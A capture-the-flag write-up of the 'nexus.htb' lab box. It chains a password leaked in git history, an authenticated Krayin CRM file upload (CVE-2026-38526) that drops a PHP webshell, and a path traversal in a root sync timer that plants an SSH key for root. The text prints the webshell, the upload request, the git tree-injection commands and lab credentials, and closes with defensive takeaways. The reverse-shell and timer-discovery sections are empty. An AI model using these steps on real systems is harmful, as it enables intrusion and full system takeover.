Three vhosts under `nexus.htb` — the apex marketing page leaking a hiring-manager email in HTML source, a `git.nexus.htb` Gitea instance whose latest commit *removed* a `DB_PASSWORD` from `.env` (but git history retains it), and a `billing.nexus.htb` Krayin CRM admin login. The leaked password authenticates the disclosed email against Krayin v2.2.0, which is vulnerable to **CVE-2026-38526** — authenticated arbitrary file upload via `/admin/tinymce/upload` with no MIME/extension validation — yielding a PHP webshell and a reverse shell as `www-data`. Krayin's `.env` exposes a second database password reused as the OS password for the system user `jones`. Privilege escalation via a `gitea-template-sync` systemd timer that runs a custom Python script as root, iterating Gitea template repositories and writing each tracked file's blob to `os.path.join(STAGING_DIR, owner, name, filepath)` without any path validation; constructing a template repository whose git tree contains an entry named `../../../../../root/.ssh/authorized_keys` causes the timer to install an attacker-controlled SSH key into root's authorized_keys.

## Reconnaissance & Enumeration

The objective of this phase was to map the attack surface and identify the application stack worth attacking.

### `nexus.htb` — email disclosure

`j.matthew@nexus.htb`. The deliberate placement in the source — visible but not in any user-facing path — has the shape of a deliberate clue rather than realistic page content. Treating it as a candidate username for any login form on the other vhosts is the obvious next step; what's missing is the password.

### `git.nexus.htb` — Gitea git-history credential disclosure

The git subdomain served a **Gitea** instance with anonymous repository browsing enabled. The user `admin` had a single public repository, `krayin-docker-setup`, containing what appeared to be infrastructure-as-code for the Krayin CRM deployment that powers the billing subdomain.

The repository's current `HEAD` was clean — `.env` contained only placeholder values. What turned out to matter was the **commit history**. The latest commit's diff:

```bash
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf.diff
diff --git a/.env b/.env
@@ -3,7 +3,7 @@
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

The diff is the entire engagement in three lines. An operator at some point committed a real database password to the `.env`, realised the mistake, and *removed it in a subsequent commit* — without rewriting history. Git's content-addressable storage means that even though the password is gone from the working tree, it remains in every clone of the repository as part of the historical commit object that introduced it. The fact that the commit `9b817fa4` is publicly browsable, and that the diff explicitly shows the *old* value, hands the credential over without any cracking required.

This is one of the most common real-world credential-disclosure mechanisms — operators routinely commit secrets, notice quickly, and "remove" them with a follow-up commit, not understanding that git history is the actual storage layer. The correct remediation requires rewriting history (`git filter-branch` or `git filter-repo`), force-pushing, and rotating the credential — which almost never happens.

## Exploitation — CVE-2026-38526 (Krayin TinyMCE Upload RCE)

### Understanding the vulnerability

Krayin CRM is a Laravel-based CRM that integrates the **TinyMCE** rich-text editor for note and email composition. TinyMCE supports inline image upload — when the user drags an image into the editor, a POST request is sent to an application-defined upload endpoint and the returned URL is embedded into the document. The convention is that the endpoint validates the upload (it should be an image) and returns the public URL.

In Krayin 2.2.x, the endpoint at `POST /admin/tinymce/upload`:

1. Requires authentication (any logged-in admin session).
2. Requires the standard Laravel CSRF token.
3. **Does not validate the file's MIME type, extension, or magic bytes.** It accepts whatever is uploaded, stores it in `/storage/tinymce/` under a random UUID filename, and **preserves the original extension**.
4. The storage directory is publicly served and PHP-handled by the nginx + php-fpm pipeline.

Composed, these three failures mean any authenticated admin can upload an arbitrary file with any extension to a path that the web server will execute. A `.php` file with PHP code in it lands as an executable URL on the server. The hint `type=image/png` in the multipart payload satisfies the editor's expectation; the actual content is whatever the attacker wants.

### Crafting the upload

The webshell is minimal:

```bash
cat shell.php
<?php system($_GET['cmd']); ?>
```

Two values needed for the request. The CSRF token is rendered into every admin page as a hidden input named `_token` — readable from the browser console while logged in:

```javascript
document.querySelector('input[name="_token"]').value
'Go6Fin7jtmDdKWc5rI0J9mlRQmJSKM8SknI2NObU'
```

And the session cookie from the browser's storage tab:

```text
krayin_crm_session=eyJpdiI6IitlYU9BaDcrK2ZSanlFVTROU1BDSEE9PSIsInZhbHVlIjoiU...
```

With both, the upload request:

```bash
curl -X POST 'http://billing.nexus.htb/admin/tinymce/upload' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -b 'krayin_crm_session=eyJpdiI6IitlYU9BaDcrK2ZSanlFVTROU1BDSEE9PSIsInZ...' \
  -F '_token=Go6Fin7jtmDdKWc5rI0J9mlRQmJSKM8SknI2NObU' \
  -F 'file=@shell.php;type=image/png'
{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/3bcc951cf3f641f69a06e960c026f2a8.php"}
```

The response is the publicly-served URL of the webshell. The `image/png` MIME label in the multipart envelope is a lie that the server accepts unconditionally, and the `.php` extension survives the random renaming.

### Reverse shell

## Privilege Escalation — `jones` → `root` (Gitea template-sync path traversal)

### Discovering the timer

```bash

# On target:

A custom timer firing every minute, activating a service named after the Gitea instance running on the other vhost. Inspecting the unit files:

```

The service runs as **root** and invokes a custom Python script at `/etc/gitea/template-sync.py`. Any attacker-controllable behaviour inside that script is a direct root primitive.

### Analysing the vulnerable script

The script's purpose is to sync Gitea "template repositories" into a local staging directory — a convenience for operators who want template-flagged repos materialised on disk. The relevant excerpt:

```python
GITEA_URL   = "http://localhost:3000"
REPO_ROOT   = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name  = repo_info['name'].lower()
    bare_path  = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    # Lista todos los blobs del HEAD del bare repo
    result = subprocess.run(
        ['git', 'ls-tree', '-r', 'HEAD'],
        cwd=bare_path,
        capture_output=True, text=True
    )

    # Itera cada entrada (mode, type, hash, path) y materializa el contenido
    for line in result.stdout.strip().split('\n'):
        meta, filepath = line.split('\t', 1)
        objhash = meta.split()[2]

        # CRITICAL: filepath comes verbatim from the git tree object — no validation
        target = os.path.join(stage_path, filepath)

        result = subprocess.run(
            ['git', 'cat-file', 'blob', objhash],
            cwd=bare_path,
            capture_output=True
        )
        with open(target, 'wb') as f:
            f.write(result.stdout)
```

Two distinct failures compose into the exploitable primitive:

**Failure 1 — `os.path.join` does not block traversal.** Python's `os.path.join('/staging/jones/rce', '../../../../../root/.ssh/authorized_keys')` returns the literal string `/staging/jones/rce/../../../../../root/.ssh/authorized_keys`. It does not normalise the path. The traversal only resolves when `open()` is eventually called and the OS canonicalises the components, by which point it's too late for the application to intervene. This is one of the most-repeated path-handling mistakes in Python codebases — the safe primitive is `os.path.realpath()` followed by an explicit prefix check, or `pathlib.Path.resolve()` with `is_relative_to()`.

**Failure 2 — git tree paths are attacker-controlled by design.** The script trusts `git ls-tree -r HEAD` to return paths that stay within the repo. But git tree objects are just lists of `(mode, type, hash, name)` tuples, and the `name` field is an arbitrary byte string. Git's high-level porcelain commands (`git add`, `git mv`) refuse to track files whose names contain `..` or `/`, but git's plumbing commands — `git update-index --cacheinfo`, `git mktree`, raw object construction — accept any name. A repository pushed with a maliciously-constructed tree object will report whatever path the attacker chose when `git ls-tree` is run against the bare repo.

The third reinforcing factor: the script only processes repositories with `template: true`, which is an attribute any Gitea user can set on their own repository via PATCH to the repo settings API. There's no allowlist of which users may have template repositories synced — every user on the Gitea instance, including `jones`, can have their template repos pulled into the sync.

The depth `../../../../../` (five levels) is calculated from the staging directory:

```text
/home/git/template-staging/<owner>/<name>/<malicious_filepath>
 ↑                                       ↑
 5 components deep                       traversal starts here
```

Five components above `<malicious_filepath>` is the filesystem root; appending `root/.ssh/authorized_keys` lands at `/root/.ssh/authorized_keys`.

### Building the malicious template repository

The exploitation has five discrete steps. They were all run from the `jones` SSH session.

**Step 1 — generate an SSH keypair the attacker controls:**

```bash
ssh-keygen -t ed25519 -f /tmp/malicious_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/malicious_key
Your public key has been saved in /tmp/malicious_key.pub

cat /tmp/malicious_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC32yZXq3jqAq1H7OMDaZC6AybsfEjVWibtaB2/7OQ0R jones@nexus
```

**Step 2 — issue a Gitea API token for `jones`** (the script syncs whichever templates exist; we just need to be able to push):

```bash
curl -s -X POST http://localhost:3000/api/v1/users/jones/tokens \
     -H "Content-Type: application/json" \
     -u 'jones:y27xb3ha!!74GbR' \
     -d '{"name":"exploit","scopes":["write:repository"]}'
{"id": 2, "name": "exploit", "sha1": "35f78ffe03719548d26616b0a0bd2b30b5175f45", [...]}
TOKEN="35f78ffe03719548d26616b0a0bd2b30b5175f45"
```

**Step 3 — create a Gitea repository and mark it as a template** (two API calls; the template flag must be set after creation):

```bash
curl -s -X POST http://localhost:3000/api/v1/user/repos \
     -H "Authorization: token $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"rce","private":false,"auto_init":true}'

curl -s -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
     -H "Authorization: token $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"template":true}'
{"template": true, [...]}
```

**Step 4 — build a local clone with a malicious tree.** The cleanest way to inject a path-traversal entry into a git tree is via `git update-index --add --cacheinfo`, which operates on the index directly and accepts arbitrary path strings:

```bash
git clone http://jones:$TOKEN@localhost:3000/jones/rce.git
cd rce

# Hash the SSH public key as a blob into the repository's object store
KEY_BLOB=$(git hash-object -w /tmp/malicious_key.pub)
echo "Blob hash: $KEY_BLOB"

# Add the blob to the index under a path with five levels of traversal
git update-index --add --cacheinfo \
    100644,$KEY_BLOB,../../../../../root/.ssh/authorized_keys

# Commit the index as-is (git write-tree + git commit-tree, wrapped by commit)
git -c user.email=j@x -c user.name=j commit -m "rce"
git push origin main
```

The push succeeds because Gitea — like any conformant git server — just accepts the pack file and stores the objects verbatim. The path validation that would have caught `..` is enforced only by `git add` on the client side, which `update-index --cacheinfo` bypasses.

**Step 5 — wait for the timer.** The timer fires once per minute. Watching the log:

```bash
tail -f /var/log/template-sync.log
[2026-06-29 17:09:07] Template sync starting
[2026-06-29 17:09:07] Found 1 template repo(s)
[2026-06-29 17:09:07] Syncing template: jones/rce
[2026-06-29 17:09:08]   synced: README.md
[2026-06-29 17:09:08]   synced: ../../../../../root/.ssh/authorized_keys
[2026-06-29 17:09:08] Template sync complete
```

The log entry confirms the path-traversal `open()` succeeded. The Python process — running as root — has just written the public key from the malicious blob into `/root/.ssh/authorized_keys`. The corresponding private key lives at `/tmp/malicious_key`, so the standard SSH-key login as root works:

```bash
ssh -i /tmp/malicious_key -o StrictHostKeyChecking=no root@10.129.234.54
Welcome to Ubuntu 24.04.4 LTS
root@nexus:~# whoami
root
root@nexus:~# cat /root/root.txt
```

The dropped key gives a fresh, stable root session — independent of the `jones` SSH session and free of any of the constraints that come with a sudo-spawned shell.

## Key Takeaways

- **Removing a credential from a file does not remove it from git history.** Every commit object in a git repository preserves the full diff of changes that introduced it. A `DB_PASSWORD=xxx → DB_PASSWORD=` change rewrites the working tree but leaves the secret embedded in the commit object that originally added it, accessible to anyone with read access on the repository. The only correct response to a committed secret is rewrite history (`git filter-repo`), force-push, *and rotate the credential* — the third step matters because clones predating the rewrite still contain the secret. Public Gitea/GitLab/GitHub instances should be assumed to have leaked secrets in their history; tools like `trufflehog`, `gitleaks`, and `git-secrets` should be in every defender's CI/CD.
- **Email addresses in HTML source are reconnaissance assets, not contact details.** A `<a href="mailto:...">` on a marketing page is a candidate username for every login form on every adjacent vhost. The Nexus apex's `j.matthew@nexus.htb` paired with the password recovered from git history was an exact-match authentication on the Krayin admin login — the engagement's pivot.
- **TinyMCE upload endpoints in Laravel CRMs are the canonical authenticated-RCE primitive.** TinyMCE's image-upload integration is conventionally implemented as a "trust the editor" endpoint that takes whatever the browser sends. CRMs and CMSes that wire it up without explicit MIME and extension validation routinely land in CVE feeds: Krayin (2026-38526), Bagisto, and several smaller Laravel forks have published advisories with effectively the same root cause. The defender's checklist on any TinyMCE integration is: enforce extension allowlist server-side, validate magic bytes (not the `Content-Type` header — the browser supplies whatever the client says), store uploads outside the PHP-served path, and serve them through an authenticated proxy.
- **`.env` files are the universal Laravel credential dump.** Every Laravel deployment has one; it routinely contains the database password, the application encryption key (which signs/verifies sessions and queues), mail credentials, third-party API keys, and frequently AWS/cloud credentials. Any code-execution primitive against a Laravel application immediately leaks all of them via `cat .env` in the project root. The defender's mitigation is to load secrets from a vault at runtime rather than from a file — but until that happens, web shells against Laravel are pre-priced into credential exposure.
- **Python's `os.path.join` is not safe against path traversal.** This is one of the most-repeated mistakes in Python codebases that handle user-influenced paths: developers assume `os.path.join` validates the result, when in fact it just concatenates with `/`. Safe pattern: resolve the joined path with `os.path.realpath` (or `pathlib.Path.resolve()`), then verify it starts with the intended prefix before opening. The bug class is identical in language after language — Node.js's `path.join`, Ruby's `File.join`, Go's `filepath.Join` all behave the same.
- **Git tree path validation lives in `git add`, not in the format.** Git's high-level porcelain commands refuse to track files whose names contain `..` or `/`, which lulls developers into trusting tree paths returned by `git ls-tree`. But tree objects can contain arbitrary path strings — `git update-index --cacheinfo`, `git mktree`, or directly-constructed binary trees all bypass the porcelain checks. Any code that consumes git tree paths and uses them in filesystem operations must validate them, not trust git to have done so already.
- **Per-minute systemd timers that run scripts as root are an attractive target.** The `gitea-template-sync.timer` exists because someone wanted automatic syncing; the fast cadence exists because they wanted a responsive feature. Both choices, individually defensible, combine into a 60-second feedback loop for attackers — short enough that exploitation development is interactive, frequent enough that the attacker doesn't have to wait for the next opportunity. Slow the timer down, or rewrite the script to drop privileges before processing user-controlled data.
- **The privesc bug is a third-party-data-trust problem, not a Gitea bug.** Gitea is doing exactly what it's documented to do — it stores whatever objects clients push and serves them back on request. The custom Python script is what fails to validate, but the underlying lesson is broader: any integration that processes data produced by *users of a different system* (here, Gitea users) must treat it with the same suspicion as direct user input. Internal-system data is not pre-sanitised; it just inherits the trust assumptions of whatever system produced it, which in Gitea's case is "anyone who can authenticate".
